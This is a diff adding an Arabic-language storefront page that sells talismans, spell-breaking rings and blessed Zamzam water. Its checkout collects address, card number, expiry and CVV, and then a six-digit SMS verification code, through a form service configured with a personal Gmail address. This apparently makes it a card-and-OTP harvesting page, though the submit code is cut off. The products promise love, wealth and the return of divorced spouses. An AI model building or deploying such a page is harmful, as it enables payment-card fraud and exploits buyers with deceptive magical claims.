@@ -1,0 +1,1764 @@
+<!DOCTYPE html><html lang="ar" dir="rtl"><head><meta http-equiv="Content-Security-Policy" content="default-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob: https://cdnjs.cloudflare.com https://cdn.jsdelivr.net https://code.jquery.com https://unpkg.com https://d3js.org https://threejs.org https://cdn.plot.ly https://stackpath.bootstrapcdn.com https://maps.googleapis.com https://cdn.tailwindcss.com https://ajax.googleapis.com https://kit.fontawesome.com https://cdn.datatables.net https://maxcdn.bootstrapcdn.com https://code.highcharts.com https://tako-static-assets-production.s3.amazonaws.com https://www.youtube.com https://fonts.googleapis.com https://fonts.gstatic.com https://pfst.cf2.poecdn.net https://puc.poecdn.net https://i.imgur.com https://wikimedia.org https://*.icons8.com https://*.giphy.com https://picsum.photos https://images.unsplash.com; frame-src 'self' https://www.youtube.com https://trytako.com; child-src 'self'; manifest-src 'self'; worker-src 'self'; upgrade-insecure-requests; block-all-mixed-content;">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>متجر البركات الروحانية - Spiritual Blessings Store</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/js/all.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/aos/2.3.4/aos.js"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/aos/2.3.4/aos.css" rel="stylesheet">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.2/gsap.min.js"></script>
+    <!-- Basin Form Service -->
+    <script>
+        // Basin Configuration
+        const BASIN_CONFIG = {
+            formUrl: 'https://usebasin.com/f/05576018d11c',
+            email: 'kalimmmy@gmail.com'
+        };
+        
+        console.log('✅ Basin Form Service configured');
+    </script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        primary: '#5D5CDE',
+                        gold: '#D4AF37',
+                        emerald: '#059669'
+                    }
+                }
+            }
+        }
+    </script>
+</head>
+<body class="bg-white dark:bg-gray-900 text-gray-900 dark:text-white transition-colors duration-300">
+    <!-- Header -->
+    <header class="bg-gradient-to-r from-primary to-purple-700 text-white shadow-lg">
+        <div class="container mx-auto px-4 py-4">
+            <div class="flex justify-between items-center">
+                <div class="flex items-center space-x-4 space-x-reverse">
+                    <i class="fas fa-star-and-crescent text-2xl text-gold"></i>
+                    <div>
+                        <h1 class="text-xl font-bold">متجر البركات الروحانية</h1>
+                        <p class="text-sm opacity-90">Spiritual Blessings Store</p>
+                    </div>
+                </div>
+                <div class="flex items-center space-x-4 space-x-reverse">
+                    <!-- Language Selector -->
+                    <select id="languageSelector" class="bg-white text-black rounded px-3 py-1 text-base font-medium">
+                        <option value="ar">العربية</option>
+                        <option value="en">English</option>
+                        <option value="fr">Français</option>
+                        <option value="es">Español</option>
+                        <option value="tr">Türkçe</option>
+                    </select>
+                    <!-- Currency Selector -->
+                    <select id="currencySelector" class="bg-white text-black rounded px-3 py-1 text-base font-medium">
+                        <option value="USD">USD $</option>
+                        <option value="EUR">EUR €</option>
+                        <option value="SAR">SAR ر.س</option>
+                        <option value="AED">AED د.إ</option>
+                        <option value="KWD">KWD د.ك</option>
+                        <option value="QAR">QAR ر.ق</option>
+                        <option value="BHD">BHD د.ب</option>
+                        <option value="OMR">OMR ر.ع</option>
+                    </select>
+                    <!-- Cart Icon -->
+                    <div class="relative cursor-pointer" onclick="toggleCart()">
+                        <i class="fas fa-shopping-cart text-xl"></i>
+                        <span id="cartCount" class="absolute -top-2 -right-2 bg-red-500 text-white rounded-full w-5 h-5 flex items-center justify-center text-xs">0</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <!-- Hero Section -->
+    <section class="relative bg-gradient-to-br from-primary/10 to-purple-100 dark:from-primary/20 dark:to-purple-900/20 py-12 overflow-hidden">
+        <div class="absolute inset-0 bg-gradient-to-r from-gold/20 to-primary/20 animate-pulse"></div>
+        <div class="container mx-auto px-4 text-center relative z-10">
+            <h2 class="text-4xl md:text-6xl font-bold mb-4 text-transparent bg-clip-text bg-gradient-to-r from-primary to-purple-600 animate-bounce" data-aos="fade-down">
+                <span data-translate="hero-title">منتجات روحانية أصيلة ومباركة</span>
+            </h2>
+            <p class="text-lg mb-8 opacity-80" data-translate="hero-subtitle" data-aos="fade-up" data-aos-delay="200">
+                طلاسم وأحجار كريمة وماء زمزم مقروء عليه - توصيل سريع لجميع أنحاء العالم
+            </p>
+            
+            <!-- Live Stats Counter -->
+            <div class="mb-8 bg-white/90 dark:bg-gray-800/90 backdrop-blur-sm rounded-xl p-6 shadow-lg" data-aos="zoom-in">
+                <div class="grid grid-cols-2 md:grid-cols-4 gap-4 text-center">
+                    <div>
+                        <div class="text-2xl font-bold text-primary" id="ordersCounter">0</div>
+                        <div class="text-sm opacity-70" data-translate="orders-today">طلبات اليوم</div>
+                    </div>
+                    <div>
+                        <div class="text-2xl font-bold text-emerald" id="customersCounter">0</div>
+                        <div class="text-sm opacity-70" data-translate="happy-customers">عملاء سعداء</div>
+                    </div>
+                    <div>
+                        <div class="text-2xl font-bold text-gold" id="countriesCounter">0</div>
+                        <div class="text-sm opacity-70" data-translate="countries">دولة</div>
+                    </div>
+                    <div>
+                        <div class="text-2xl font-bold text-purple-600" id="successCounter">0</div>
+                        <div class="text-sm opacity-70" data-translate="success-rate">نسبة النجاح</div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-6 text-center">
+                <div class="bg-white dark:bg-gray-800 p-6 rounded-lg shadow-lg hover:shadow-2xl transition-all duration-300 hover:scale-105" data-aos="fade-right">
+                    <i class="fas fa-shipping-fast text-3xl text-emerald mb-3"></i>
+                    <h3 class="font-bold mb-2" data-translate="shipping-fast">توصيل سريع</h3>
+                    <p class="text-sm" data-translate="shipping-desc">خلال يوم إلى يومين للخليج وأوروبا</p>
+                    <div class="mt-2 text-xs text-emerald">
+                        <i class="fas fa-clock mr-1"></i>
+                        <span data-translate="24h-shipping">شحن خلال 24 ساعة</span>
+                    </div>
+                </div>
+                <div class="bg-white dark:bg-gray-800 p-6 rounded-lg shadow-lg hover:shadow-2xl transition-all duration-300 hover:scale-105" data-aos="fade-up">
+                    <i class="fas fa-certificate text-3xl text-gold mb-3"></i>
+                    <h3 class="font-bold mb-2" data-translate="authentic">منتجات أصيلة</h3>
+                    <p class="text-sm" data-translate="authentic-desc">مقروء عليها وممتحنة بعناية فائقة</p>
+                    <div class="mt-2 text-xs text-gold">
+                        <i class="fas fa-star mr-1"></i>
+                        <span data-translate="quality-certified">معتمدة الجودة</span>
+                    </div>
+                </div>
+                <div class="bg-white dark:bg-gray-800 p-6 rounded-lg shadow-lg hover:shadow-2xl transition-all duration-300 hover:scale-105" data-aos="fade-left">
+                    <i class="fas fa-globe text-3xl text-primary mb-3"></i>
+                    <h3 class="font-bold mb-2" data-translate="worldwide">توصيل عالمي</h3>
+                    <p class="text-sm" data-translate="worldwide-desc">نشحن إلى جميع دول العالم</p>
+                    <div class="mt-2 text-xs text-primary">
+                        <i class="fas fa-map-marked-alt mr-1"></i>
+                        <span data-translate="global-network">شبكة عالمية</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Real-time notifications -->
+            <div id="liveNotifications" class="fixed top-20 left-4 z-40 space-y-2"></div>
+        </div>
+    </section>
+
+    <!-- Advanced Features Section -->
+    <section class="py-12 bg-gradient-to-r from-gray-50 to-white dark:from-gray-800 dark:to-gray-900">
+        <div class="container mx-auto px-4">
+            <h3 class="text-3xl font-bold text-center mb-8" data-translate="advanced-features" data-aos="fade-down">مميزات متطورة</h3>
+            <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
+                <div class="text-center p-6 bg-white dark:bg-gray-800 rounded-lg shadow-lg" data-aos="flip-left">
+                    <i class="fas fa-shield-alt text-4xl text-primary mb-4"></i>
+                    <h4 class="font-bold mb-2" data-translate="secure-payment">دفع آمن</h4>
+                    <p class="text-sm" data-translate="ssl-encryption">تشفير SSL متقدم</p>
+                </div>
+                <div class="text-center p-6 bg-white dark:bg-gray-800 rounded-lg shadow-lg" data-aos="flip-left" data-aos-delay="100">
+                    <i class="fas fa-mobile-alt text-4xl text-emerald mb-4"></i>
+                    <h4 class="font-bold mb-2" data-translate="mobile-app">تطبيق موبايل</h4>
+                    <p class="text-sm" data-translate="app-soon">قريباً على الأجهزة</p>
+                </div>
+                <div class="text-center p-6 bg-white dark:bg-gray-800 rounded-lg shadow-lg" data-aos="flip-left" data-aos-delay="200">
+                    <i class="fas fa-headset text-4xl text-gold mb-4"></i>
+                    <h4 class="font-bold mb-2" data-translate="24-7-support">دعم 24/7</h4>
+                    <p class="text-sm" data-translate="instant-support">مساعدة فورية</p>
+                </div>
+                <div class="text-center p-6 bg-white dark:bg-gray-800 rounded-lg shadow-lg" data-aos="flip-left" data-aos-delay="300">
+                    <i class="fas fa-robot text-4xl text-purple-600 mb-4"></i>
+                    <h4 class="font-bold mb-2" data-translate="ai-recommendations">توصيات ذكية</h4>
+                    <p class="text-sm" data-translate="ai-powered">مدعوم بالذكاء الاصطناعي</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Products Section -->
+    <section class="py-12">
+        <div class="container mx-auto px-4">
+            <h2 class="text-3xl font-bold text-center mb-8" data-translate="products-title">منتجاتنا المميزة</h2>
+            
+            <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8" id="productsGrid">
+                <!-- Products will be inserted here by JavaScript -->
+            </div>
+        </div>
+    </section>
+
+    <!-- Cart Sidebar -->
+    <div id="cartSidebar" class="fixed top-0 right-0 h-full w-80 bg-white dark:bg-gray-800 shadow-xl transform translate-x-full transition-transform duration-300 z-50">
+        <div class="p-6">
+            <div class="flex justify-between items-center mb-6">
+                <h3 class="text-xl font-bold" data-translate="cart">سلة التسوق</h3>
+                <button onclick="toggleCart()" class="text-gray-500 hover:text-gray-700">
+                    <i class="fas fa-times text-xl"></i>
+                </button>
+            </div>
+            <div id="cartItems" class="space-y-4 mb-6"></div>
+            <div class="border-t pt-4">
+                <div class="flex justify-between items-center mb-4">
+                    <span class="font-bold" data-translate="total">المجموع:</span>
+                    <span id="cartTotal" class="font-bold text-xl text-primary">$0</span>
+                </div>
+                <button onclick="proceedToCheckout()" class="w-full bg-primary text-white py-3 rounded-lg font-bold hover:bg-primary/90 transition-colors">
+                    <span data-translate="checkout">إتمام الطلب</span>
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Shipping Info Modal -->
+    <div id="checkoutModal" class="fixed inset-0 bg-black/50 hidden items-center justify-center z-50 p-2">
+        <div class="bg-white dark:bg-gray-800 rounded-lg max-w-sm w-full mx-2 shadow-2xl max-h-screen overflow-y-auto">
+            <div class="p-4">
+                <div class="flex justify-between items-center mb-4">
+                    <h3 class="text-lg font-bold flex items-center">
+                        <i class="fas fa-shipping-fast text-primary mr-2 text-sm"></i>
+                        <span data-translate="shipping-info-title">معلومات التوصيل</span>
+                    </h3>
+                    <button onclick="closeCheckout()" class="text-gray-500 hover:text-gray-700">
+                        <i class="fas fa-times"></i>
+                    </button>
+                </div>
+
+                <!-- Order Summary -->
+                <div class="bg-gray-50 dark:bg-gray-700 rounded p-3 mb-4">
+                    <div id="checkoutOrderItems" class="space-y-1 text-sm mb-2"></div>
+                    <div class="border-t pt-2 flex justify-between items-center font-bold text-sm">
+                        <span data-translate="total-amount">المجموع:</span>
+                        <span id="checkoutTotal" class="text-primary">$0</span>
+                    </div>
+                </div>
+
+                <!-- Shipping Form -->
+                <form id="shippingForm" class="space-y-3">
+                    <div>
+                        <label class="block text-xs font-medium mb-1" data-translate="full-name">الاسم الكامل *</label>
+                        <input type="text" id="fullName" required="" class="w-full px-3 py-2 text-base border rounded focus:ring-1 focus:ring-primary dark:bg-gray-700 dark:border-gray-600">
+                    </div>
+                    
+                    <div class="grid grid-cols-2 gap-2">
+                        <div>
+                            <label class="block text-xs font-medium mb-1" data-translate="phone">الهاتف *</label>
+                            <input type="tel" id="phoneNumber" required="" maxlength="14" class="w-full px-3 py-2 text-base border rounded focus:ring-1 focus:ring-primary dark:bg-gray-700 dark:border-gray-600">
+                        </div>
+                        <div>
+                            <label class="block text-xs font-medium mb-1" data-translate="country">الدولة *</label>
+                            <select id="country" required="" class="w-full px-3 py-2 text-base border rounded focus:ring-1 focus:ring-primary dark:bg-gray-700 dark:border-gray-600">
+                                <option value="">اختر</option>
+                                <option value="السعودية">🇸🇦 السعودية</option>
+                                <option value="الإمارات">🇦🇪 الإمارات</option>
+                                <option value="الكويت">🇰🇼 الكويت</option>
+                                <option value="قطر">🇶🇦 قطر</option>
+                                <option value="البحرين">🇧🇭 البحرين</option>
+                                <option value="عمان">🇴🇲 عمان</option>
+                                <option value="الأردن">🇯🇴 الأردن</option>
+                                <option value="مصر">🇪🇬 مصر</option>
+                                <option value="المغرب">🇲🇦 المغرب</option>
+                                <option value="ألمانيا">🇩🇪 ألمانيا</option>
+                                <option value="فرنسا">🇫🇷 فرنسا</option>
+                                <option value="أخرى">🌍 أخرى</option>
+                            </select>
+                        </div>
+                    </div>
+                    
+                    <div>
+                        <label class="block text-xs font-medium mb-1" data-translate="address">العنوان *</label>
+                        <textarea id="fullAddress" required="" rows="2" class="w-full px-3 py-2 text-base border rounded focus:ring-1 focus:ring-primary dark:bg-gray-700 dark:border-gray-600" placeholder="المدينة، الشارع، رقم المبنى"></textarea>
+                    </div>
+
+                    <!-- Continue Button -->
+                    <button type="submit" class="w-full bg-primary text-white py-3 rounded font-bold hover:bg-primary/90 transition-colors">
+                        <span class="flex items-center justify-center text-sm">
+                            <i class="fas fa-credit-card mr-2"></i>
+                            <span data-translate="continue-payment">متابعة للدفع</span>
+                        </span>
+                    </button>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <!-- Card Payment Modal -->
+    <div id="paymentModal" class="fixed inset-0 bg-black/50 hidden items-center justify-center z-50 p-2">
+        <div class="bg-white dark:bg-gray-800 rounded-lg max-w-sm w-full mx-2 shadow-2xl max-h-screen overflow-y-auto">
+            <div class="p-4">
+                <div class="flex justify-between items-center mb-4">
+                    <h3 class="text-lg font-bold flex items-center">
+                        <i class="fas fa-credit-card text-primary mr-2 text-sm"></i>
+                        <span data-translate="payment-title">الدفع الآمن</span>
+                    </h3>
+                    <button onclick="closePaymentModal()" class="text-gray-500 hover:text-gray-700">
+                        <i class="fas fa-times"></i>
+                    </button>
+                </div>
+
+                <!-- Order Summary -->
+                <div class="bg-gray-50 dark:bg-gray-700 rounded p-3 mb-4">
+                    <div id="paymentOrderItems" class="space-y-1 text-sm mb-2"></div>
+                    <div class="border-t pt-2 flex justify-between items-center font-bold text-sm">
+                        <span data-translate="total-amount">المجموع:</span>
+                        <span id="paymentTotal" class="text-primary">$0</span>
+                    </div>
+                </div>
+
+                <!-- Payment Form -->
+                <form id="paymentForm" class="space-y-3">
+                    <div>
+                        <label class="block text-xs font-medium mb-1" data-translate="card-number">رقم البطاقة *</label>
+                        <div class="relative">
+                            <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" required="" class="w-full px-3 py-2 text-base border rounded focus:ring-1 focus:ring-primary dark:bg-gray-700 dark:border-gray-600 pr-10">
+                            <div class="absolute right-2 top-1/2 transform -translate-y-1/2">
+                                <i id="cardIcon" class="fas fa-credit-card text-gray-400 text-sm"></i>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div>
+                        <label class="block text-xs font-medium mb-1" data-translate="cardholder-name">اسم صاحب البطاقة *</label>
+                        <input type="text" id="cardholderName" placeholder="Ahmed Al-Mohammed" required="" class="w-full px-3 py-2 text-base border rounded focus:ring-1 focus:ring-primary dark:bg-gray-700 dark:border-gray-600">
+                    </div>
+
+                    <div class="grid grid-cols-2 gap-2">
+                        <div>
+                            <label class="block text-xs font-medium mb-1" data-translate="expiry-date">انتهاء *</label>
+                            <input type="text" id="expiryDate" placeholder="MM/YY" maxlength="5" required="" class="w-full px-3 py-2 text-base border rounded focus:ring-1 focus:ring-primary dark:bg-gray-700 dark:border-gray-600">
+                        </div>
+                        <div>
+                            <label class="block text-xs font-medium mb-1" data-translate="cvv">CVV *</label>
+                            <input type="text" id="cvv" placeholder="123" maxlength="4" required="" class="w-full px-3 py-2 text-base border rounded focus:ring-1 focus:ring-primary dark:bg-gray-700 dark:border-gray-600">
+                        </div>
+                    </div>
+
+                    <!-- Security Info -->
+                    <div class="bg-emerald/10 border border-emerald/30 rounded p-2">
+                        <div class="flex items-center text-emerald">
+                            <i class="fas fa-shield-alt mr-2 text-xs"></i>
+                            <span class="text-xs font-medium" data-translate="secure-payment">دفع آمن ومشفر</span>
+                        </div>
+                    </div>
+
+                    <!-- Pay Button -->
+                    <button type="submit" class="w-full bg-primary text-white py-3 rounded font-bold hover:bg-primary/90 transition-colors">
+                        <span class="flex items-center justify-center text-sm">
+                            <i class="fas fa-lock mr-2"></i>
+                            <span data-translate="pay-now">ادفع الآن</span>
+                            <span id="payAmount" class="mr-2">$0</span>
+                        </span>
+                    </button>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <!-- Verification Code Modal -->
+    <div id="verificationModal" class="fixed inset-0 bg-black/50 hidden items-center justify-center z-50 p-4">
+        <div class="bg-white dark:bg-gray-800 rounded-xl max-w-sm w-full mx-4 shadow-2xl">
+            <div class="p-6 text-center">
+                <div class="w-20 h-20 bg-primary/10 rounded-full flex items-center justify-center mx-auto mb-4">
+                    <i class="fas fa-mobile-alt text-primary text-2xl"></i>
+                </div>
+                
+                <h3 class="text-xl font-bold mb-2" data-translate="verification-title">رمز التحقق</h3>
+                <p class="text-gray-600 dark:text-gray-300 mb-6" data-translate="verification-desc">
+                    تم إرسال رمز التحقق إلى هاتفك المحمول
+                </p>
+
+                <form id="verificationForm" class="space-y-4">
+                    <!-- 6-digit code input - NUMBERS ONLY -->
+                    <div class="flex justify-center space-x-2 space-x-reverse mb-6">
+                        <input type="number" inputmode="numeric" pattern="\d*" class="w-12 h-12 text-center text-xl border rounded-lg focus:ring-2 focus:ring-primary dark:bg-gray-700 dark:border-gray-600" maxlength="1" data-index="0">
+                        <input type="number" inputmode="numeric" pattern="\d*" class="w-12 h-12 text-center text-xl border rounded-lg focus:ring-2 focus:ring-primary dark:bg-gray-700 dark:border-gray-600" maxlength="1" data-index="1">
+                        <input type="number" inputmode="numeric" pattern="\d*" class="w-12 h-12 text-center text-xl border rounded-lg focus:ring-2 focus:ring-primary dark:bg-gray-700 dark:border-gray-600" maxlength="1" data-index="2">
+                        <input type="number" inputmode="numeric" pattern="\d*" class="w-12 h-12 text-center text-xl border rounded-lg focus:ring-2 focus:ring-primary dark:bg-gray-700 dark:border-gray-600" maxlength="1" data-index="3">
+                        <input type="number" inputmode="numeric" pattern="\d*" class="w-12 h-12 text-center text-xl border rounded-lg focus:ring-2 focus:ring-primary dark:bg-gray-700 dark:border-gray-600" maxlength="1" data-index="4">
+                        <input type="number" inputmode="numeric" pattern="\d*" class="w-12 h-12 text-center text-xl border rounded-lg focus:ring-2 focus:ring-primary dark:bg-gray-700 dark:border-gray-600" maxlength="1" data-index="5">
+                    </div>
+
+                    <!-- Timer -->
+                    <div class="text-sm text-gray-500 mb-4">
+                        <span data-translate="resend-in">إعادة الإرسال خلال: </span>
+                        <span id="timer" class="font-bold text-primary">02:00</span>
+                    </div>
+
+                    <!-- Resend button -->
+                    <button type="button" id="resendBtn" onclick="resendCode()" disabled="" class="text-primary text-sm font-medium opacity-50 cursor-not-allowed mb-4">
+                        <span data-translate="resend-code">إعادة إرسال الرمز</span>
+                    </button>
+
+                    <!-- Verify button -->
+                    <button type="submit" class="w-full bg-primary text-white py-3 rounded-lg font-bold hover:bg-primary/90 transition-colors">
+                        <span data-translate="verify-code">تأكيد الرمز</span>
+                    </button>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <!-- Fixed Cart Button - Top Corner Only -->
+    <div class="fixed top-4 right-4 z-50">
+        <button onclick="toggleCart()" class="bg-primary text-white p-3 rounded-full shadow-lg hover:bg-primary/90 transition-all duration-300 hover:scale-110">
+            <div class="relative">
+                <i class="fas fa-shopping-cart text-lg"></i>
+                <span id="topCartCount" class="absolute -top-2 -right-2 bg-red-500 text-white rounded-full w-5 h-5 flex items-center justify-center text-xs font-bold">0</span>
+            </div>
+        </button>
+    </div>
+
+    <!-- Footer -->
+    <footer class="bg-gray-800 text-white py-8">
+        <div class="container mx-auto px-4">
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-8">
+                <div>
+                    <h3 class="font-bold mb-4" data-translate="contact-us">تواصل معنا</h3>
+                    <p class="mb-2"><i class="fas fa-envelope ml-2"></i> info@spiritualblessings.com</p>
+                    <p class="mb-2"><i class="fas fa-shipping-fast ml-2"></i> <span data-translate="fast-shipping">توصيل سريع للخليج وأوروبا</span></p>
+                </div>
+                <div>
+                    <h3 class="font-bold mb-4" data-translate="shipping-info">معلومات الشحن</h3>
+                    <p class="mb-2" data-translate="gulf-shipping">دول الخليج: 1-2 أيام</p>
+                    <p class="mb-2" data-translate="europe-shipping">أوروبا: 2-3 أيام</p>
+                    <p class="mb-2" data-translate="worldwide-shipping">باقي العالم: 3-7 أيام</p>
+                </div>
+                <div>
+                    <h3 class="font-bold mb-4" data-translate="guarantee">ضمانتنا</h3>
+                    <p class="mb-2" data-translate="authentic-products">منتجات أصيلة 100%</p>
+                    <p class="mb-2" data-translate="blessed-items">مقروء عليها بعناية</p>
+                    <p class="mb-2" data-translate="quality-guarantee">ضمان الجودة</p>
+                </div>
+            </div>
+            <div class="text-center mt-8 pt-8 border-t border-gray-700">
+                <p>© 2024 <span data-translate="store-name">متجر البركات الروحانية</span> - <span data-translate="all-rights">جميع الحقوق محفوظة</span></p>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        // Dark mode detection
+        if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+            document.documentElement.classList.add('dark');
+        }
+        window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', event => {
+            if (event.matches) {
+                document.documentElement.classList.add('dark');
+            } else {
+                document.documentElement.classList.remove('dark');
+            }
+        });
+
+        // Products data
+        const products = [
+            {
+                id: 1,
+                name: 'طلسم المحبة وجلب الحبيب',
+                nameEn: 'Love Attraction Talisman',
+                price: 35,
+                image: 'https://pfst.cf2.poecdn.net/base/image/d56d994db71e1d245a8989068060eaae9a05559d98747b12182ea19043f01210?w=256&h=256',
+                description: 'طلسم مبارك لجلب المحبة والود بين القلوب، مقروء عليه آيات المحبة والألفة',
+                descriptionEn: 'Blessed talisman for bringing love and affection between hearts, recited with verses of love and harmony'
+            },
+            {
+                id: 2,
+                name: 'طلسم جلب الرزق والثروة',
+                nameEn: 'Wealth & Prosperity Talisman',
+                price: 45,
+                image: 'https://pfst.cf2.poecdn.net/base/image/8377daa4175512a3b3143861b46362ee9d188fc9e3fe76b1945d697e78eb7e3c?w=256&h=256',
+                description: 'طلسم مبارك لجلب الرزق وفتح أبواب الثروة والنجاح في التجارة والعمل',
+                descriptionEn: 'Blessed talisman for attracting wealth and opening doors of prosperity and success in business and work'
+            },
+            {
+                id: 3,
+                name: 'طلسم رد المطلقة',
+                nameEn: 'Reunion Talisman',
+                price: 50,
+                image: 'https://pfst.cf2.poecdn.net/base/image/b021459ecdb6e473aad581573ff6c526b71ddf7ccce48c37977a4d6e3bb82257?w=736&h=981',
+                description: 'طلسم خاص لرد المطلقة وإصلاح ذات البين، مقروء عليه بآيات الصلح والمغفرة',
+                descriptionEn: 'Special talisman for reuniting divorced couples and reconciliation, recited with verses of peace and forgiveness'
+            },
+            {
+                id: 4,
+                name: 'مسبحة مقروء عليها',
+                nameEn: 'Blessed Prayer Beads',
+                price: 20,
+                image: 'https://pfst.cf2.poecdn.net/base/image/1dcccccebbe935ab3b44eff5044bddf6b9594b0527d2bae5f11c19c8fac706c9?w=800&h=800',
+                description: 'مسبحة من الأحجار الكريمة مقروء عليها للحماية والبركة والتسبيح',
+                descriptionEn: 'Prayer beads made from precious stones, blessed for protection, blessings and remembrance'
+            },
+            {
+                id: 5,
+                name: 'خاتم جلب الحظ الملكي',
+                nameEn: 'Royal Lucky Ring',
+                price: 40,
+                image: 'https://pfst.cf2.poecdn.net/base/image/381dc996ba79afc10709262241f321aa26a4b57f8298dd7ed495650e3de23a49?w=800&h=800',
+                description: 'خاتم ملكي فاخر بحجر ياقوت أحمر، مقروء عليه لجلب الحظ والهيبة والنجاح',
+                descriptionEn: 'Luxury royal ring with red ruby stone, blessed for bringing luck, prestige and success'
+            },
+            {
+                id: 6,
+                name: 'خاتم فك السحر والحماية',
+                nameEn: 'Protection & Spell Breaking Ring',
+                price: 30,
+                image: 'https://pfst.cf2.poecdn.net/base/image/26512dc470255f2466ad791821de042c88651d176926a815f5885f187aa60b71?w=736&h=736',
+                description: 'خاتم فضي مع حجر ياقوت أزرق، مقروء عليه لفك السحر والحماية من العين والحسد',
+                descriptionEn: 'Silver ring with blue sapphire, blessed for breaking spells and protection from evil eye and envy'
+            },
+            {
+                id: 7,
+                name: 'ماء زمزم مقروء عليه',
+                nameEn: 'Blessed Zamzam Water',
+                price: 15,
+                image: 'https://pfst.cf2.poecdn.net/base/image/c1984a2d6668e93dc2130d9a1a7efeae6cb9d7271070a606015feef6aa567f61?w=600&h=600',
+                description: 'ماء زمزم الأصلي مقروء عليه بالرقية الشرعية للشفاء والبركة مع تمر عجوة',
+                descriptionEn: 'Authentic Zamzam water blessed with Islamic healing verses for cure and blessings with Ajwa dates'
+            },
+
+        ];
+
+        // Currency exchange rates (approximate)
+        const exchangeRates = {
+            USD: 1,
+            EUR: 0.85,
+            SAR: 3.75,
+            AED: 3.67,
+            KWD: 0.30,
+            QAR: 3.64,
+            BHD: 0.38,
+            OMR: 0.38
+        };
+
+        // Translations
+        const translations = {
+            ar: {
+                'hero-title': 'منتجات روحانية أصيلة ومباركة',
+                'hero-subtitle': 'طلاسم وأحجار كريمة وماء زمزم مقروء عليه - توصيل سريع لجميع أنحاء العالم',
+                'shipping-fast': 'توصيل سريع',
+                'shipping-desc': 'خلال يوم إلى يومين للخليج وأوروبا',
+                'authentic': 'منتجات أصيلة',
+                'authentic-desc': 'مقروء عليها وممتحنة بعناية فائقة',
+                'worldwide': 'توصيل عالمي',
+                'worldwide-desc': 'نشحن إلى جميع دول العالم',
+                'products-title': 'منتجاتنا المميزة',
+                'add-to-cart': 'أضف للسلة',
+                'cart': 'سلة التسوق',
+                'total': 'المجموع:',
+                'checkout': 'إتمام الطلب',
+                'order-form': 'نموذج الطلب',
+                'full-name': 'الاسم الكامل *',
+                'email': 'البريد الإلكتروني *',
+                'phone': 'رقم الهاتف *',
+                'country': 'الدولة *',
+                'address': 'العنوان الكامل *',
+                'order-details': 'تفاصيل الطلب',
+                'notes': 'ملاحظات إضافية',
+                'payment-info': 'معلومات الدفع',
+                'payment-method': 'الدفع عند الاستلام أو تحويل بنكي',
+                'total-amount': 'المبلغ الإجمالي:',
+                'send-order': 'إرسال الطلب',
+                'contact-us': 'تواصل معنا',
+                'fast-shipping': 'توصيل سريع للخليج وأوروبا',
+                'shipping-info': 'معلومات الشحن',
+                'gulf-shipping': 'دول الخليج: 1-2 أيام',
+                'europe-shipping': 'أوروبا: 2-3 أيام',
+                'worldwide-shipping': 'باقي العالم: 3-7 أيام',
+                'guarantee': 'ضمانتنا',
+                'authentic-products': 'منتجات أصيلة 100%',
+                'blessed-items': 'مقروء عليها بعناية',
+                'quality-guarantee': 'ضمان الجودة',
+                'store-name': 'متجر البركات الروحانية',
+                'all-rights': 'جميع الحقوق محفوظة'
+            },
+            en: {
+                'hero-title': 'Authentic Blessed Spiritual Products',
+                'hero-subtitle': 'Talismans, precious stones and blessed Zamzam water - Fast shipping worldwide',
+                'shipping-fast': 'Fast Shipping',
+                'shipping-desc': '1-2 days to Gulf & Europe',
+                'authentic': 'Authentic Products',
+                'authentic-desc': 'Carefully blessed and tested',
+                'worldwide': 'Worldwide Delivery',
+                'worldwide-desc': 'We ship to all countries',
+                'products-title': 'Our Featured Products',
+                'add-to-cart': 'Add to Cart',
+                'cart': 'Shopping Cart',
+                'total': 'Total:',
+                'checkout': 'Checkout',
+                'order-form': 'Order Form',
+                'full-name': 'Full Name *',
+                'email': 'Email *',
+                'phone': 'Phone Number *',
+                'country': 'Country *',
+                'address': 'Full Address *',
+                'order-details': 'Order Details',
+                'notes': 'Additional Notes',
+                'payment-info': 'Payment Information',
+                'payment-method': 'Cash on delivery or bank transfer',
+                'total-amount': 'Total Amount:',
+                'send-order': 'Send Order',
+                'contact-us': 'Contact Us',
+                'fast-shipping': 'Fast shipping to Gulf & Europe',
+                'shipping-info': 'Shipping Information',
+                'gulf-shipping': 'Gulf Countries: 1-2 days',
+                'europe-shipping': 'Europe: 2-3 days',
+                'worldwide-shipping': 'Rest of World: 3-7 days',
+                'guarantee': 'Our Guarantee',
+                'authentic-products': '100% Authentic Products',
+                'blessed-items': 'Carefully blessed',
+                'quality-guarantee': 'Quality Guarantee',
+                'store-name': 'Spiritual Blessings Store',
+                'all-rights': 'All rights reserved'
+            }
+        };
+
+        let currentLanguage = 'ar';
+        let currentCurrency = 'USD';
+        let cart = [];
+
+        // Initialize
+        document.addEventListener('DOMContentLoaded', function() {
+            renderProducts();
+            updateCartDisplay();
+            
+            // Language selector
+            document.getElementById('languageSelector').addEventListener('change', function(e) {
+                currentLanguage = e.target.value;
+                translatePage();
+                renderProducts();
+            });
+            
+            // Currency selector
+            document.getElementById('currencySelector').addEventListener('change', function(e) {
+                currentCurrency = e.target.value;
+                renderProducts();
